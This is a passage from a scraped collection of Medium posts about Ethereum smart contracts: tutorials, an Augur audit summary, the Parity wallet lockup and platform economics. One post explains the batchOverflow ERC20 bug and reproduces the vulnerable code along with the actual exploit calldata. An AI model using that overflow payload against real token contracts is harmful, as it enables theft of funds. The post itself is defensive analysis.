execute potentially insecure code, then you could use another method I\u2019ve left commented in the code. You could instantiate the target ICO contract and call it\u2019s buyTokens function directly.This function also sets the investedInICO flag so we can only call this function once. If the people involved wanted to pool more money and invest a second time, they would have to create a new ICOPool contract.Withdrawing the tokensOnce the previous step has been completed, the target ICO\u2019s token should be holding our ICOPool\u2019s token balance.You should be able to check this by calling the balanceOf() function of the token by passing the ICOPool\u2019s address to it.So, there\u2019s one more step left that each contributor has to complete; the withdrawal of the tokens each one is entitled to.function withdrawTokens(address _tokenAddress) public {        require(contributorsBalance[msg.sender] > 0);                ERC20 token = ERC20(_tokenAddress);        require (token.balanceOf(this) > 0);                // tokenBalance is always the max tokens the pool bought (balanceOf + already withdrawn)        uint tokenBalance = token.balanceOf(this).add(tokensWithdrawn);                // Get contributor share based on his contribution vs total pool        // poolBalance (total wei pooled) -> contributorsBalance[msg.sender] (wei put by msg.sender)        // tokenBalance (total tokens bought with poolBalance) -> tokensToWithdraw (how many tokens corresponds to msg.sender)        uint tokensToWithdraw = tokenBalance.mul(contributorsBalance[msg.sender]).div(poolBalance);        tokensToWithdraw = tokensToWithdraw.sub(tokensWithdrawnByContributor[msg.sender]);                require(tokensToWithdraw > 0);                // Keep track of tokens already withdrawn        tokensWithdrawn = tokensWithdrawn.add(tokensToWithdraw);        tokensWithdrawnByContributor[msg.sender] = tokensWithdrawnByContributor[msg.sender].add(tokensToWithdraw);                // Transfer calculated tokens to msg.sender        require(token.transfer(msg.sender,tokensToWithdraw));    }As I mentioned above, the ICOPool contract is now holding the tokens it bought. Now it\u2019s up to each contributor to withdraw their own tokens by having each one of them call the withdrawTokens(address _tokenAddress) function.Notice the function requires one parameter, the token\u2019s address, not to be confused by the ICO\u2019s address. At this point, the ICO has no utility, what we need is to change the ownership of the tokens, so we need to get a hold of the token address.When one of the contributors calls this function, it will calculate how many tokens they are entitled to based on the total money the pool received and how much this person\u2019s contribution represents. For example, suppose the total pool balance was 100 eth, that were used to buy 100.000 tokens. If I invested 30 ether, then I would be entitled to 30.000 tokens.The function will figure out how many tokens of the total that were bought correspond to the contributor and then call the transfer function on the token to make the transfer from the contract to the contributor.If you call balanceOf() again, the contributor should now own those many tokens and the contract should have those many less.One thing to notice is that this function has been designed so that the contributor may call it more than once, and if there were more tokens than before, he would get the difference. You might be wondering why we are doing this if I previously mentioned that the ICOPool contract may only buy tokens once. Well, there\u2019s the slight chance that our ICOPool contract might receive tokens besides buying them. There\u2019s a popular marketing practice some ICOs are implementing lately called Airdrops where they basically send tokens to random addresses in order to promote their product.The way our withdrawTokens() function works allows the contributors to get their share of these tokens as well.Where to go from hereThere are lots of improvements that can be done to this contract. For example:The person deploying the contract \u2014 the admin \u2014 will incur in more costs than the rest of the contributors because he has to pay the necessary gas to deploy the ICOPool contract, and he is not reimbursed for it. We could device some scheme that rewards more tokens to the person organizing the investment pool.We could add a deadline to it so if the tokens are not bought by that date the pool gets cancelled.If there was some standard or common protocol to crowdsale contracts we could make our contract friendlier to the contributors.The contract could be modified to allow investing in more than one ICO, and even decide, somehow, in which ICOs to invest given their bonus schemes.Drop me a line if you are interested in implementing this contract to invest in an ICO. And please do contact me if you find any bugs or you want to discuss any parts of this code.I hope you enjoyed reading this article as much as I enjoyed writing it. I\u2019m currently taking consultancy jobs related to smart contracts development. If you are planning on raising funds through an ICO or building a Blockchain-based product, feel free to get in touch with me.", "responses": 5, "tags": ["Ethereum", "Smart Contracts", "ICO", "Solidity", "Tutorial"]}, {"title": "Augur Core Audit", "post_link": "https://medium.com/zeppelin-blog/augur-core-audit-244160d77c09?source=search_post", "author_name": "Zeppelin", "author_link": "https://medium.com/@ZeppelinOrg", "publish_date": "2018-03-12", "last_modified_date": "2019-02-13", "readtime": "3.80", "claps": 310, "voters": 37, "content": "Augur Core AuditZeppelinFollowMar 12, 2018 \u00b7 4 min readThe Augur team asked us to review and audit their Augur Core project. We looked at the code and now publish our results.The audited project can be found in the AugurProject/augur-core GitHub repository. The version used for this report is commit 45e1afb7eb1a895d923c97fe01e068c772c583ef.Update: the Augur team implemented some of our recommendations and added new features, after which we performed a second audit round. The commit for the final audit is 3b5a63d372d205a0214e3061293d5bca0fd5636a.Update 2: the Augur team implemented our additional recommendations after the second audit. The final commit containing all the fixes is 7f3c79a5dd471a98df8f66a640902e063f15f796.The full report can be found here, and a list summary of the issues ordered by severity can be found next.Critical SeverityUse safe math (new)An attacker can manipulate the tentative winning outcome in case a forkAn attacker can prevent forking-market traders from claiming their feesMarkets can be migrated after finalizationMarkets are not sanity-checked in trading moduleUniverse open interest can be manipulated by an attackerComplete sets of shares can be purchased for freeAlternative denomination tokens can be stolen from a Reporting WindowOrder info is repeated as arguments when cancelling an orderIt may not be possible to stake tokens on an invalid outcomeMarkets ether balance can be stolen by the first reporterAll reporting fees can be frozen by a Market creatorA market owner can block the Participation token purchaseHigh SeverityExtractable functionality is not necessary and error proneNon-potential-winning dispute crowdsourcers can redeem their REP tokensMarket number of ticks can be zeroSelf-reference in market nudging mechanismTight coupling between contractsAnyone can trigger Augur eventsCancelling an order with share tokens in escrow will failMarkets can be created with malicious Cash tokensShareholders fees can be frozen by a malicious market creatorSpender contracts cannot be re-approved if updatedMedium SeverityFavor pull payments over push payments (new)Integer index types are unnecessarily smallUnbound iteration in arrays (new)Unbound iteration in arraysUsers are allowed to place orders for a market independently of their stateUnclear relation between MIN_ORDER_VALUE and MINIMUM_GAS_NEEDEDReentrancy risk in FillOrderMarkets can be initially reported in a locked universeForking market can be migratedFork values for child universes must be manually updatedTrading contracts upgradeability may become uselessController does not guarantee that dev mode cannot be turned on againWhitelisted contracts are not explicit to the userFavor pull payments over push paymentsIt is possible to create orders for untrusted marketsMarkets can be created in a locked universeEventually it will not be possible to produce further forksSpender contracts cannot be re-approved if updatedNaming issuesRepeated code for factory contractsUnused boolean return valuesUnsolved TODO commentsInstances of Map contract left in blockchain storageUnused Set libraryInconsistent usage of getter functions and state variablesUse a standard toolchain for building contractsNo assertions for detecting broken invariantsInstall OpenZeppelin via NPMOpenZeppelin standard tokens were modifiedOutdated OpenZeppelin\u2019s contractsOutdated documentationOrders are vulnerable to front-runningBasic token implementation allows transfers to the zero addressLack of Report abstractionUniverse open interest is not decremented in bad timesMarkets can fork into more than N+1 universes, N being the number of outcomes (new)Markets may fork in more than N+1 universes, N being the number of outcomesWhen a market forks, stake tokens and disputes of other markets are resetUnchecked token transfers and approvalsShareToken is unnecessarily whitelistedUse safe mathRemove unused codeThe Trade logic treats a lack of gas as a complete order fillMarket creators may not be able to collect their corresponding feesDelegator memory allocation not working for arguments larger than 32 bytesDelegator not working for return data greater than 32 bytesLow SeverityNaming issuesRepeated code for factory contractsUnused boolean return valuesUnsolved TODO commentsInstances of Map contract left in blockchain storageUnused Set libraryInconsistent usage of getter functions and state variablesUse a standard toolchain for building contractsNo assertions for detecting broken invariantsInstall OpenZeppelin via NPMOpenZeppelin standard tokens were modifiedOutdated OpenZeppelin\u2019s contractsOutdated documentationOrders are vulnerable to front-runningBasic token implementation allows transfers to the zero addressLack of Report abstractionUniverse open interest is not decremented in bad timesMarkets can fork into more than N+1 universes, N being the number of outcomes (new)Markets may fork in more than N+1 universes, N being the number of outcomesWhen a market forks, stake tokens and disputes of other markets are resetUnchecked token transfers and approvalsShareToken is unnecessarily whitelistedUse safe mathRemove unused codeThe Trade logic treats a lack of gas as a complete order fillMarket creators may not be able to collect their corresponding feesDelegator memory allocation not working for arguments larger than 32 bytesDelegator not working for return data greater than 32 bytesConclusionThirteen critical and ten high severity issues were found, along with recommendations on how to fix them. Additionally, some medium and lower severity issues were found and explained. Some changes were proposed to follow best practices and reduce the potential attack surface.Note that as of the date of publishing, the above review reflects the current understanding of known security patterns as they relate to the Augur project. The above should not be construed as investment advice or an offering of REP tokens. For general information about smart contract security, check out our thoughts here.Be part of the communityContinue the discussion on our forumRequest a security auditEven better, join the team \ud83d\ude80", "responses": 1, "tags": ["Ethereum", "Security", "Solidity", "Audit", "Augur"]}, {"title": "$150 Million Locked On the Ethereum Network \u2014 How to Protect Yourself", "post_link": "https://medium.com/tokenstandards/150-million-locked-on-the-ethereum-network-how-to-protect-yourself-d687d17ed810?source=search_post", "author_name": "Mason", "author_link": "https://medium.com/@masonic_tweets", "publish_date": "2017-11-07", "last_modified_date": "2018-04-11", "readtime": "2.96", "claps": 386, "voters": 36, "content": "$150 Million Locked On the Ethereum Network \u2014 How to Protect YourselfComplexity Is the Enemy of SecurityMasonFollowNov 7, 2017 \u00b7 3 min readParity is an Ethereum implementation written in Rust, spearheaded by the very talented cofounder of Ethereum, Gavin Wood. The implementation provides an easy to use GUI for creating multi-sig wallets. The multi-sig contract that underpins this functionality was found to have a vulnerability on July 19, 2017 that resulted in a loss of $30 million. On November 7, 2017 a second vulnerability was found in the wallet contract that resulted in a lockup of $150 million in Ether. While Ethereum does not offer a simple solution for high security wallets, there are a few steps you can take to prevent falling victim to such an attack.The bug report filed by the \u201cattacker\u201dIn a traditional production software environment, we\u2019re able to deploy code to a public interface such as a website. If the code does not appear to carry the functionality we hope it does, what happens? Perhaps no one notices, perhaps a few people complain, at the end of the day we can update the code and the minor nuisance is resolved. In the world of Ethereum, once we deploy a piece of code it is there forever, for everyone to see and play with. In an ideal world, only you have access to this code, in the world of blockchain everyone has access to it. This means that if a piece of code is deployed to the Ethereum network, its in most cases not possible to update it.A Conversation With the \u201cattacker\u201dIf we put $1 million in Ether into a smart contract and the smart contract is found to contain a vulnerability, a few things may occur. It may go unnoticed, it may go noticed by a hacker who decides to exploit it, or it will be uncovered by the contract owner and they will be able to recover the funds. In this case it was exploited by an individual claiming to be \u201cresearching\u201d the previous Parity hack.The \u201cattacker\u201dSo how can we protect ourselves?KISS Principle \u2014 Keep it simple stupidMost smart contracts introduce vulnerabilities by attempting to account for corner cases and optimizations. The first Parity vulnerability was due to an attempt to optimize the amount of gas used during execution. The current Parity vulnerability was due to the inclusion of new, untested library functionality. A manageable smart contract will contain the minimum amount of functionality necessary to complete the task. Introducing code to optimize a premature solution increases the complexity of the contract, thereby reducing the security.Unit TestsIn common software development as well as smart contract development it can be convenient to overlook adequate unit tests. When code is non-revocable once it reaches production, a higher level of diligence is required. As a rule of thumb, your smart contract should contain adequate unit tests to verify the functionality of your smart contract as well as the corner cases.Smart Contract AuditsAny smart contract that is sent to production should undergo a security audit. A good smart contract security auditor will have experience building real-world smart contracts, a wealth of projects on GitHub, and will share a check list of the common vulnerabilities that they look for. Ensure the auditor can engage in conversation about the various attack vectors associated with your smart contract. This may not seem like a formal approach, however the industry is still very young and this is how it operates at the moment.Following these guidelines can help reduce the risk and anxiety associated with sending smart contracts to the Ethereum Mainnet.Test, Audit, Deploy.", "responses": 0, "tags": ["Ethereum", "Cybersecurity", "Smart Contracts", "Solidity", "Decentralization"]}, {"title": "The Smart Contract Network Fallacy", "post_link": "https://medium.com/blockchannel/the-smart-contract-network-fallacy-7b4d27f4d149?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2017-08-29", "last_modified_date": "2018-05-06", "readtime": "5.90", "claps": 199, "voters": 36, "content": "The Smart Contract Network FallacyBlockChannelFollowAug 29, 2017 \u00b7 6 min readNote: This post assumes foundational understanding of crypto. This post was originally featured on BraveNewCoin and was written by Kyle Samani of Multicoin Capital.Ethereum is unquestionably the market leading smart contract platform. It\u2019s the oldest and most mature. It likely has the best protocol developers and certainly has the best community. Developer interest is surging. Major companies are investing in the platform. It has a clear roadmap. It\u2019s led by one of the brightest minds of our era.Ethereum\u2019s network value is about $30B. Here\u2019s the competition:NEO \u2014 $2BEthereum Classic \u2014 $1.5BQTUM \u2014 $.9BStratis \u2014 $.6BWAVES \u2014 $.5BEOS \u2014 $.5BLisk \u2014 $.25BAt current prices, the combined network value of all of Ethereum\u2019s competitors is about 10\u201315% of Ethereum\u2019s network value.Market prices imply that Ethereum has a strong network effect. Ethereum presents itself as the \u201cworld computer,\u201d which naturally begs for OS-like analogies: the more developers use Ethereum, the more users will want Ether, which encourages more developers, etc.This analogy doesn\u2019t capture the nuance of the dynamics at play. Smart contract platforms like Ethereum should not be compared to operating systems, but rather to programming languages.Specifically, the OS analogy misrepresents the network effects for the supply side (why should developers choose Ethereum) and demand side (why should users buy Ether). Concerns about network security are valid, but can be largely mitigated through cross-chain anchoring.I\u2019ll walk through each of these fallacies below.DEMAND SIDE \u2014 USERS WON\u2019T CAREOperating systems create network effects because users make a mutually exclusive decision to use one OS at the expense of not choosing another OS. You cannot run Windows and Linux on your desktop (ignoring virtual machines since only a small minority of users have a need or technical ability to leverage virtual machines effectively).Since users are locked into an OS, developers naturally develop for the OS. This creates more and better apps for the OS, which draws in more users. The virtuous cycle flourishes.Users won\u2019t have to know or care about which blockchain they\u2019re interacting with. To most users, blockchains will be abstracted to \u201cplease enter your password to verify your transaction.\u201dAs a user interacting with distributed applications (Dapps), you will never \u201csee\u201d a blockchain. All you will see is a web3 front end that triggers an on-chain transaction using a tool such as Parity or Metamask (for the rest of this post, I\u2019ll refer to these types of tools as web3 clients even though web3 is technically Ethereum-specific). Although web3 clients don\u2019t yet exist for non-Ethereum chains, they\u2019re being built and will be available soon, and they\u2019ll support multiple chains. In time, browsers will natively implement multi-chain web3 clients.Web3 clients themselves can abstract this problem even further. As web3 clients implement support for many chains, they\u2019ll also integrate decentralized exchanges such as Shapeshift and 0x. As a user, if you try to interact with a Dapp that requires Stratis tokens, but you only have Ether, your web3 client will seamlessly sell your Ether for Stratis on an exchange in real time. Then the web3 client will send those Stratis tokens to the Dapp. As a user, you won\u2019t know or care about the underlying token at all.Your web3 client will generate a mnemonic seed that\u2019s used to derive private keys, public keys, and addresses for all supported chains. As a user, you\u2019ll only have to memorize/store one \u201cpassword\u201d and everything else will be seamless.To sum up all of the above, as a user, you won\u2019t have to care what chain or token you\u2019re using. All Dapps will, regardless of underlying technology platform, just work. All chain and token complexity will be abstracted away.SUPPLY SIDE \u2014 INTEROPERABLE TOKENS COMMODITIZE CHAINSWith any two smart contract platforms, tokens can roam across chains. ETH tokens will not be bound to the Ethereum chain. Stratis tokens will be available on the NEO chain, and Tezos tokens will be available on the WAVES chain.How? Synthetic tokens.Imagine a two known smart contracts, one on the ETH chain, one on the ETC chain. If I want to move X ETH tokens to the ETC chain, I send some ETH to that contract on the ETH chain and specify my ETC address. When the ETH contract receives my ETH, it triggers the ETC contract to release X tokens to my ETC address. Those synthetic tokens can also be called ETH. This system works in both directions.(I recognize this diagram doesn\u2019t correctly portray how smart contracts issue tokens on a technical basis, but it\u2019s still useful to illustrate how assets move across chains)This function will level the playing field between chains. When any coin will run on any chain, why care about the chain or the token at all? A lot of complexity gets abstracted away.Note there is one obvious downside to this mechanism: gas costs on each chain must be paid in the chain\u2019s native currency. However, gas costs shouldn\u2019t be significant on a % basis. If more than .1-.2% of transaction volume is being paid in gas, the chain itself will probably fail. In light of the framework I proposed above, the \u201chow does a user pay for gas?\u201d question is legitimate, but not substantial in impact relative to the gains of token-chain abstraction.MITIGATING NETWORK SECURITY RISKS THROUGH CROSS CHAIN ANCHORINGAs a token loses network value, risk of 51%-style attacks increases. This is obviously true for proof-of-stake consensus systems. It\u2019s also true for proof-of-work consensus systems as miners choose which coins to mine based on cost to mine vs value of the coin.But even network security risk can be mitigated through cross chain anchoring. Ethereum is adopting this mechanism in Plasma by committing merkle roots from child chains to parent chains. This is live in Factom today: Factom anchors a merkle root of its own chain to every Bitcoin block.In time, we\u2019ll start to see most chains anchor themselves to other chains as a form of risk mitigation. Attacking a network will require attacking all anchored networks. This is exponentially more difficult than attacking a single chain.SMART CONTRACT PLATFORMS ARE LIKE PROGRAMMING LANGUAGESIf users won\u2019t care about underlying chains, if the tokens are instantly and seamlessly tradeable, if tokens themselves roam across chains, and if network security can be maintained, what avenues of differentiation are left between chains? Basically, dev tools and governance mechanisms.Stratis has a singular focus: make it as easy as possible for C# devs to build using blockchains. There are millions of C# developers today, most of whom probably don\u2019t want to learn Solidity (native Ethereum language) or Ocaml for Tezos. You could argue that C# developers are being irrational and should learn languages that are designed specifically for blockchains. For example, it\u2019s unlikely that Stratis will be able to implement formal verification since C# wasn\u2019t designed with formal verification in mind.On the other hand, Javascript was developed as a front end language, but is now one of the most popular back end languages courtesy of Node.js. Some developers hate loosely typed languages like Javascript. Others hate statically-typed language likes C.Even though all of the major programming languages today provide Turing-completeness, the market has empirically demonstrated a need for many programming languages with unique tradeoffs (readability, compiled vs interpreted, abstractions, memory management, native performance, parallelizability, etc).A single blockchain shouldn\u2019t dictate the rules and mechanics of all smart contract development. Given the lack of strong network effects, many smart contract platforms will thrive.Now let\u2019s turn to governance. Dash has had on-chain governance for a few years. By all accounts, it seems to work rather well. Tezos has presented a variation of Dash\u2019s on-chain governance. The Dash community is thriving, innovating, and growing. On-chain governance may be what blockchains have always needed but never had.There aren\u2019t any historical counterfactuals to prove this case. Bitcoin has obviously faced serious governance challenges in the last couple of years, but many open source projects have thrived in the absence of on-chain governance. The Linux kernel, the many Linux desktops, Firefox, Wikipedia, Chrome (and all of its forks), the Android Open Source Project (and all of its forks), WebRTC, Ethereum itself, and many other open source projects have succeeded without a formal stakeholder engagement model.SUMMARYCurrent market prices imply that Ethereum is going to be the runaway market leader for smart contract platforms. This is not a given. There are many secular trends at the demand level, supply level, and security level that commoditize most of Ethereum\u2019s perceived advantages. Ethereum will not be the sole smart contract platform. That\u2019s not to say Ethereum isn\u2019t here to stay or that Ethereum won\u2019t thrive. I wouldn\u2019t bet against Ethereum. But there will be huge opportunities for non-Ethereum smart contract platforms. Ethereum will not be the one smart contract platform to rule them all.", "responses": 0, "tags": ["Ethereum", "Bitcoin", "Smart Contracts", "Solidity", "Blockchain"]}, {"title": "Ethos Unaffected by batchOverflow ERC20 Bug", "post_link": "https://medium.com/ethos-io/ethos-unaffected-by-batchoverflow-erc20-bug-7f80ef29f2d2?source=search_post", "author_name": "Shingo Lavine", "author_link": "https://medium.com/@shingolavine", "publish_date": "2018-04-25", "last_modified_date": "2018-06-15", "readtime": "4.02", "claps": 506, "voters": 37, "content": "Ethos Unaffected by batchOverflow ERC20 BugShingo LavineFollowApr 25, 2018 \u00b7 5 min readHey Ethos community! Doing a special post here today in light of recent news of a vulnerability in some ERC20 contracts. Specifically, this bug is the batchOverflow bug outlined in this piece: https://medium.com/coinmonks/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536All credit goes to them for finding this bug. I\u2019ll be trying to simplify it to make it understandable and address any concerns you all may have around this bug.Contract/Transaction in QuestionContract with the vulnerability: https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#codeTransaction exploiting vulnerability: https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660fBreaking it Down \u2014 Integer OverflowSo what\u2019s going on here? How did they send so many tokens? It essentially boils down to the age-old \u201cinteger overflow\u201d attack. An integer overflow occurs when you try to enter a value that is too big for the range that can be stored.For example, if you have an 8-bit integer, the largest number you can represent is 255 or 0b11111111 in binary. If you add 1 to 0b11111111, instead of getting 256 (0b100000000), which requires at least one more bit to store, you will get 0 as all the bits will flip to 0. If you notice, 256 has a 1 then 8 0s, but in an integer overflow, only the 0s are stored. For more information on integer overflows, read here: https://en.wikipedia.org/wiki/Integer_overflowHow Did That Cause a Vulnerability?Let\u2019s take a look at the code\u2026function batchTransfer(address[] _receivers, uint256 _value) public      whenNotPaused returns (bool) {     uint cnt = _receivers.length;     uint256 amount = uint256(cnt) * _value;     require(cnt > 0 && cnt <= 20);     require(_value > 0 && balances[msg.sender] >= amount);     balances[msg.sender] = balances[msg.sender].sub(amount);     for (uint i = 0; i < cnt; i++) {          balances[_receivers[i]] = balances[_receivers[i]].add(_value);          Transfer(msg.sender, _receivers[i], _value);          }     return true;     }}And let\u2019s take a look at the offending transaction dataFunction: batchTransfer(address[] _receivers, uint256 _value)MethodID: 0x83f12fec[0]:  0000000000000000000000000000000000000000000000000000000000000040[1]:  8000000000000000000000000000000000000000000000000000000000000000[2]:  0000000000000000000000000000000000000000000000000000000000000002[3]:  000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033[4]:  0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7The attacker used a very large value for the uint256 _value (specifically 0x8000000000000000000000000000000000000000000000000000000000000000) as seen in [1] and then they passed in two receivers (0xb4d30cac5124b46c2df0cf3e3e1be05f42119033) and (0x0e823ffe018727585eaf5bc769fa80472f76c3d7) as seen in [3] and [4]uint cnt = _receivers.length;uint256 amount = uint256(cnt) * _value;Those two lines, with cnt = 2 and _value equal to 0x8000000000000000000000000000000000000000000000000000000000000000, cause the amount to overflow and zero out which leads us to the first issue in this contract.Always use SafeMathThe following is a SafeMath implementation/** * Math operations with safety checks */contract SafeMath {  function safeMul(uint a, uint b) internal returns (uint) {    uint c = a * b;    assert(a == 0 || c / a == b);    return c;  }function safeDiv(uint a, uint b) internal returns (uint) {    assert(b > 0);    uint c = a / b;    assert(a == b * c + a % b);    return c;  }function safeSub(uint a, uint b) internal returns (uint) {    assert(b <= a);    return a - b;  }function safeAdd(uint a, uint b) internal returns (uint) {    uint c = a + b;    assert(c>=a && c>=b);    return c;  }function max64(uint64 a, uint64 b) internal constant returns (uint64) {    return a >= b ? a : b;  }function min64(uint64 a, uint64 b) internal constant returns (uint64) {    return a < b ? a : b;  }function max256(uint256 a, uint256 b) internal constant returns (uint256) {    return a >= b ? a : b;  }function min256(uint256 a, uint256 b) internal constant returns (uint256) {    return a < b ? a : b;  }function assert(bool assertion) internal {    if (!assertion) {      throw;    }  }}SafeMath prevents integer overflow attacks by implementing \u201csafe\u201d versions of addition, subtraction etc.While the contract actually did include the SafeMath library at the top of the contract, they didn\u2019t use it here. It is also worth noting that above is the ETHOS smart contract SafeMath implementation and that the contract in question had a different implementation. I did not do an in depth audit of the contract so I cannot attest to the accuracy of their implementation.Sanity Checks didn\u2019t check for Sane Inputrequire(cnt > 0 && cnt <= 20);require(_value > 0 && balances[msg.sender] >= amount);The next few lines were designed to be sanity checks, but they didn\u2019t actually check for the overflow that just happened. cnt = 2 which is well within the range and the _value is > 0 while the amount got overflowed and zeroed out.Woohoo Free Money!balances[msg.sender] = balances[msg.sender].sub(amounatt);     for (uint i = 0; i < cnt; i++) {          balances[_receivers[i]] = balances[_receivers[i]].add(_value);          Transfer(msg.sender, _receivers[i], _value);          }The next few lines, after passing the \u201csanity check\u201d, execute the transaction sending the massive _value that was passed in while subtracting nothing from the attacker.Some ObservationsThe contract makes a number of errors. Most notably, they implemented SafeMath, but didn\u2019t use it. The batchTransfer function also is not part of the standard ERC20 interface, although there is nothing wrong with it in principle. Implementing a new function can sometimes be dangerous since it won\u2019t be as battle-tested and audited as standard ERC20 functions which are already well understood.ETHOS Contract Unaffected by batchTransfer VulnerabilityThe ETHOS smart contract implements SafeMath (as outlined above) and uses SafeMath for every mathematical operation. While this does consume slightly more gas, the security that is gained by eliminating potential overflow attacks is considerable.ETHOS also does NOT implement the batchTransfer function in the token contract. It is not part of the ERC20 standard interface. ETHOS has developed a tool internally that will be used for airdrops and payroll that has similar and greater functionality than the batchTransfer function which has been separated out into an independent contract for greater security.The ETHOS token contract also went through an internal security audit whose results were published here: https://www.ethos.io/2017/08/08/bqx-smart-contract-code-review-result/Bottom line, batchTransfer is a vulnerability that only affects a subset of ERC20 contracts that implemented an additional function outside of the standard ERC20 interface and ETHOS is unaffected by this vulnerability.Shingo LavineFounder & CEOEthos.io", "responses": 1, "tags": ["Ethereum", "Erc20", "Ethos", "Solidity", "Vulnerability"]}, {"title": "Security Audit And Testing For Smart Contracts", "post_link": "https://medium.com/@ksystemsio/security-audit-and-testing-for-smart-contracts-12e957c4b7c5?source=search_post", "author_name": "K SYSTEMS LTD", "author_link": "https://medium.com/@ksystemsio", "publish_date": "2018-08-24", "last_modified_date": "2018-08-24", "readtime": "0.94", "claps": 532, "voters": 34, "content": "Security Audit And Testing For Smart ContractsK SYSTEMS LTDFollowAug 24, 2018 \u00b7 1 min readAt K Systems LTD we have a very long experience with Pen Testing. Our CEO has been a Security Expert since 2000, and for us, security is an essential part of our business. We brought our experience to the Crypto World and adapted our policies and techniques to the Solidity programming language.How does it work?K Systems LTD Security Audit for Smart ContractsYou submit us your Solidity Smart Contracts, and we run an in-depth analysis and security risks assessment on them. The cost of this service is 4000 KSYS Tokens per contract.We use, among many other tools, Mythril (from ConsenSys).We are preparing a cool UI in our KSYS Shop where you will be able to upload your code and pay for the services.The KSYS Shop will open officially during Q4, 2018.Stay tuned, join our official Telegram Channel or Telegram Group for the latest updates!", "responses": 1, "tags": ["Ethereum", "Solidity", "Blockchain", "ICO"]}, {"title": "Build your first Ethereum smart contract during lunch break", "post_link": "https://medium.com/taipei-ethereum-meetup/build-your-first-ethereum-smart-contract-during-lunch-break-89b2a5a952d2?source=search_post", "author_name": "Jeff Hu", "author_link": "https://medium.com/@jj1385jeff850527", "publish_date": "2017-08-06", "last_modified_date": "2018-11-26", "readtime": "4.47", "claps": 628, "voters": 35, "content": "Build your first Ethereum smart contract during lunch breakJeff HuFollowAug 6, 2017 \u00b7 5 min readThis tutorial promised to guide you through your first smart contract in 25 minutes. Sit tight and let\u2019s begin.Lunch break plays a crucial role in the daily life of many of us, so as Blockchain and the Bitcoin, who went viral on the globe in recent years. You could nearly tell the movement of Bitcoin price, by the peculiar look gave from the person you bumped into on street. Not long ago, the emergence of Ethereum brought the preciosity of blockchain technology back to community. Each of us, you and me, now have the pen to sign off a contract.3 steps in totalGet what you needSwift guide through the codeDeploy and try it outStep 1 >>> What you needsolidity (https://solidity.readthedocs.io/en/develop/)truffle (http://truffleframework.com/)testrpc (https://github.com/ethereumjs/testrpc)# Note: If you came across difficulties in downloading these tools, please leave your words down there, so I would help you with that. :)Step 2 >>> Let\u2019s codeStory: Today, you and your friends wanna organize a lunch gathering with the other friends, but you are not sure who will attend, and who will not. You have reserved a group lunch with given price and limited seats in a nice Taiwanese restaurant, and you hope to split the cost with the attendees eventually. How could the smart contract help you?I. Create ProjectKick off your terminal and type in:mkdir lunch-contract    // This will be the root of your projectcd lunch-contracttruffle init            // Let truffle does everything for youopen the directory in your favorite editor, and you now have:- contracts/- migrations/- test/- truffle.js# Note: Luckily, we only need to play with contracts/ and migrations/ in this tutorial. You could delve in the documentation of truffle for sure.II. Launch a TestnetCool, let\u2019s run up an Ethereum test net in your computer. Please start off the other terminal in the lunch-contract/ directory, and type in:testrpcThat is astonishing, you\u2019ve launched your first test net!# Note: More excitingly, in the loggings, there are 10 accounts already registered for you, for FREE lol.III. Create the ContractCreate a new file under contracts/ directory named Lunch.sol. Inside Lunch.sol, put in the skeleton of contract:contract Lunch {    // Your code goes here later}IV. Initialize the VariablesRight below the line contract Lunch, initialize your variables as such:address public organizer;mapping (address => bool) public attendeeJoined;uint public numOfAttendee;uint public limit;uint public totalCost;<Tips>:address: A special variable type in solidity, who represents an account.public: Let everyone outside of this contract can still access this variable.mapping: A special variable type as well, which maps every given address to a Boolean value, in this case.uint: Unsigned integer that saves storage space better.V. Set up a ConstructorUnder all the initialization, please do:function Lunch() {    organizer = msg.sender;    limit = 10;    numOfAttendee = 0;    totalCost = 100;}<Tips>:msg: Every call of the method of this contract will happen along with a msg object, whose sender is the address of caller.VI. Method 1: Change the total cost:Let\u2019s insert this function under the constructor.function changeTotalCost(uint newTotalCost) public {    if (msg.sender != organizer) { return; }    totalCost = newTotalCost;}<Tips>:Method arguments: For this method, the only argument is newTotalCost as uint type.Access control: The if-statement prevents anyone, other than the organizer, to change the total cost.VII. Method 2: Attend the lunch:This is probably the most complicated part of this tutorial. How could your friend attend? Place the attend method in.function attend() public payable returns (bool) {    if (numOfAttendee >= limit) { return false; }    attendeeJoined[msg.sender] = true;    numOfAttendee++;    return true;}<Tips>:payable: Allows this contract to be transferred REAL MONEY, namely ether, which will then be stored at this contract\u2019s address. We don\u2019t practically require it here, but it serves as a demonstration.return: The type of returned value is necessary to be specified as a Boolean, in this case. Be reminded this syntax is quite different from Javascript.VIII. Method 3: How many available seats left:function getAvailable() public returns (uint) {    return limit - numOfAttendee;}VIIII. Method 4: Check attendance:function checkAttendance(address people) public returns (bool) {    return attendeeJoined[people];}X. Method 5: Split cost:function splitCost() public returns (uint) {    return totalCost / numOfAttendee;}# Note: Since both the types of totalCost and numOfAttendee are uint, the return value will then be converted to uint.XI. Kill method:function kill() {    if (msg.sender == organizer) {      suicide(organizer);    }}# Note: It is a good thing to kill or commit suicide in Solidity, in so doing that all the REAL MONEY(ether) stored at this contract, will be transferred back to the creator of this contract. Yet, in this tutorial we don\u2019t have ether transferal.Step 3>>> Deploy the contract and try outGo to migration/ and open 2_deploy_contracts.js, comment out all the lines and change it to:var Lunch = artifacts.require(\"./Lunch.sol\");module.exports = function(deployer) {  deployer.deploy(Lunch);};All the code-writings are done here! Congrats! In your console, type in:truffle consoleNow we open a window toward your Ethereum test net, anything we do here can impact the test net directly. To deploy your contract:deployYour Lunch contract is now successfully deployed on the test net. Let\u2019s get the accounts you\u2019ve created.accounts = web3.eth.accountsInstantiate a Lunch contract and assign to lunch, and then we can interact with lunch:Lunch.new().then(obj => lunch = obj)Congratulation and Bon App\u00e9tit!Incredible! You have just completed and deployed your first contract on Ethereum with a whole lot of cool methods! Why not buy yourself a decent meal first, and then we talk later?Play AroundEverything is ready now! There are some testing examples provided for you, but are not limited.(1) Check the limit of the number of attendee:lunch.limit.call()// Or lunch.limit.call().then(obj=>obj.c[0])(2) Change total cost to 500, and check it:lunch.changeTotalCost.sendTransaction(500, {from: accounts[0]})lunch.totalCost.call()// Or 